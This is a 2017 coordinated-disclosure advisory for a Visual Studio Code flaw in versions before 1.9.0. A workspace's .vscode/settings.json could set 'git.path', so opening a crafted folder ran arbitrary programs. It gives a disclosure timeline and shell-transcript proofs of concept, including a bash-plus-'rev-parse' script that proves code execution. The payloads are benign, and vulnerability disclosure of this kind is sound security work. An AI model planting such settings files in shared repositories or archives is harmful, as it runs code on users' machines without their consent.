The following issue constitutes an arbitrary code execution vulnerability in
Visual Studio Code (herein referred to as "Code").

Users should upgrade to Code 1.9.0 or later.

<https://en.wikipedia.org/wiki/Visual_Studio_Code> says:

> Visual Studio Code is a source code editor developed by Microsoft for
> Windows, Linux and macOS. It includes support for debugging, embedded Git
> control, syntax highlighting, intelligent code completion, snippets, and code
> refactoring. It is also customizable, so users can change the editor's theme,
> keyboard shortcuts, and preferences. It is free and open-source, although the
> official download is under a proprietary license.

The vulnerability can be exploited in the event that a user loads a directory
in Code, where that directory contains specially-crafted contents. In Code
parlance, a directory represents a "Workspace".

This could arise in the following scenarios:

* Where an attacker controls a world-readable directory on a multi-user system
  (e.g. within `/tmp/`) that a user can be convinced to open as a Workspace.

* Where an attacker can provide a tarball that a user can be convinced to
  extract then open as a Workspace.

* Where an attacker controls a git repo which a user can be convinced to clone
  and then open as a Workspace.

Other scenarios are left as an exercise for the reader.

All examples below were captured using Code version 1.7.2 as installed on
Debian Testing from `code_1.7.2-1479766213_amd64.deb` (SHA256
`6bf92cc50f58053538d07f64d91b5cb2469c532dff130fb5107f402134e079b5`)

Disclosure Timeline
-------------------

* 5 Dec 2016 - Issue reported to the project with a coordinated disclosure date of 6 March 2017
* Late Jan 2017 - Issue fixed in various commits
* 2 Feb 2017 - 1.9.0 released
* 2 Mar 2017 - Advisory published

The project did not notify me that a fix had been published despite there being
an agreed-upon coordinated disclosure date (at 90 days or upon fix, whichever
came first)

Microsoft also did not allocate a CVE as requested.

Visual Studio Code automatically loads unsafe Workspace Settings
----------------------------------------------------------------

* OVE ID: OVE-20170302-0001
* Private disclosure date: 2016-12-06
* Public disclosure date: 2017-03-02
* Vendor advisory: <https://code.visualstudio.com/updates/v1_9#_settings-and-security>
* Affected versions: `< 1.9.0`

Code, when opening a Workspace, automatically loads Workspace Settings from a
file named `.vscode/settings.json`. Opening a Workspace is understood to be a
common activity, as it allows for the viewing and editing of multiple files
within a directory structure. Documentation regarding Workspace Settings and
their mechanics is available at
<https://code.visualstudio.com/Docs/customization/userandworkspace>

The loading of Workspace Settings allows for the configuration of unsafe
parameters, such as the path to the Git executable and whether Git
functionality should be enabled by the Workspace.

The specification of the path to the Git executable, and the enabling of Git
functionality, allows an attacker to induce arbitrary command execution upon
opening a Workspace within Code.

### POC

#### Cause the "yes" program to be executed

```text
[justin@671335e66d2d D ~]% mkdir -p test1/.vscode

[justin@671335e66d2d D ~]% cat > test1/.vscode/settings.json
{
  "git.path": "yes"
}
^D

[justin@671335e66d2d D ~]% ps -ef | grep yes
justin     934   394  0 07:00 pts/0    00:00:00 grep --color=auto yes

[justin@671335e66d2d D ~]% code ./test1/
  [... Code starts up as an X application ...]

[justin@671335e66d2d D ~]% ps -ef | grep yes
justin    1043   991 91 07:00 ?        00:00:03 /usr/share/code/code /usr/share/code/resources/app/out/bootstrap yes /home/justin/test1 utf8 /usr/share/code/code yes (GNU coreutils) 8.25 Copyright (C) 2016 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.  Written by David MacKenzie.
justin    1066  1043 25 07:00 ?        00:00:01 yes rev-parse --show-toplevel
justin    1076   394  0 07:01 pts/0    00:00:00 grep --color=auto yes
```

`yes` is clearly running.

#### Discover how Git is being invoked:

`git.path` is set to be the path to a shell script which will snitch on how
`git` is being invoked.

```text
[justin@671335e66d2d D ~]% mkdir -p test2/.vscode

[justin@671335e66d2d D ~]% cat > test2/.vscode/settings.json
{
  "git.path": "/home/justin/test2/log_how_we_do.sh"
}
^D

[justin@671335e66d2d D ~]% cat > test2/log_how_we_do.sh
#!/bin/sh
echo "CWD: $PWD" >> /home/justin/how_we_do.log
echo "doing: $0 $@" >> /home/justin/how_we_do.log
echo "---" >> /home/justin/how_we_do.log
^D

[justin@671335e66d2d D ~]% chmod u+x test2/log_how_we_do.sh

[justin@671335e66d2d D ~]% code ./test2/
  [... Code starts up as an X application ...]

[justin@671335e66d2d D ~]% cat how_we_do.log
CWD: /home/justin
doing: /home/justin/test2/log_how_we_do.sh --version
---
CWD: /home/justin/test2
doing: /home/justin/test2/log_how_we_do.sh rev-parse --show-toplevel
---
CWD: /home/justin
doing: /home/justin/test2/log_how_we_do.sh status -z -u
---
CWD: /home/justin
doing: /home/justin/test2/log_how_we_do.sh symbolic-ref --short HEAD
---
CWD: /home/justin
doing: /home/justin/test2/log_how_we_do.sh for-each-ref --format %(refname) %(objectname)
---
CWD: /home/justin
doing: /home/justin/test2/log_how_we_do.sh remote --verbose
---
CWD: /home/justin
doing: /home/justin/test2/log_how_we_do.sh status -z -u
---
CWD: /home/justin
doing: /home/justin/test2/log_how_we_do.sh symbolic-ref --short HEAD
---
CWD: /home/justin
doing: /home/justin/test2/log_how_we_do.sh for-each-ref --format %(refname) %(objectname)
---
CWD: /home/justin
doing: /home/justin/test2/log_how_we_do.sh remote --verbose
---
```

Git is being invoked a number of times. It is first executed with the argument
`--version` with the CWD being the CWD from where Code was launched, and then
it is executed with the arguments `rev-parse --show-toplevel` with the CWD
being the path to the Workspace being opened.

In separate testing, it was found that Code will seemingly cease to perform Git
invocations if any invocation returns an exit code other than 0.

#### Gain code execution

We can set the Git path to be `bash` and plant a Bash script in the workspace
directory with a filename of `rev-parse`. `bash --version` returns an exit code
of 0, and so we should get through to the invocation of `bash rev-parse
--show-toplevel` which will execute our Bash script.

By having the `rev-parse` Bash script exit with a non-zero status, we can
early-out of the series of Git invocations.

```text
[justin@671335e66d2d D ~]% mkdir -p test3/.vscode

[justin@671335e66d2d D ~]% cat > test3/.vscode/settings.json
{
  "git.path": "bash"
}
^D

[justin@671335e66d2d D ~]% cat > test3/rev-parse
#!/bin/sh
echo "Arbitrary command execution as $(id)" > /home/justin/command_execution.proof
exit 1
^D

```

Trigger the bug:

```text
[justin@671335e66d2d D ~]% cat command_execution.proof
cat: command_execution.proof: No such file or directory

[justin@671335e66d2d D ~]% code ./test3/
  [... Code starts up as an X application ...]

[justin@671335e66d2d D ~]% cat command_execution.proof
Arbitrary command execution as uid=31337(justin) gid=31337(justin) groups=31337(justin),27(sudo)
```

---

Justin Steven

<https://twitter.com/justinsteven>
